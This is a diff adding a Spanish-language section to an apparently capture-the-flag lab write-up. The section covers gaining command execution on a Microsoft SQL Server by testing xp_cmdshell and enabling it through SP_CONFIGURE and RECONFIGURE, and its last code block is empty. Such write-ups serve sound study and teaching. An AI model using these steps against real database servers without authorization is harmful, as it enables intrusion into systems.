@@ -228,3 +228,22 @@ impacket-mssqlclient dc1.scrm.local -k
 
 
 ### Explotación Microsoft SQL Server
+Podemos probar si se nos permite ejecutar comandos dentro del servicio ejecutando
+```shell
+xp_cmdshell "whoami"
+```
+
+En caso de que no nos deje modificamos la configuracion con habilitando la edicion
+```shell
+SP_CONFIGURE "show advanced options", 1
+```
+
+A continuacion tendremos que ejecutar un
+```shell
+RECONFIGURE
+```
+
+Para que se apliquen los cambios y poder habilitar `xp_cmdshell`
+```shell
+
+```
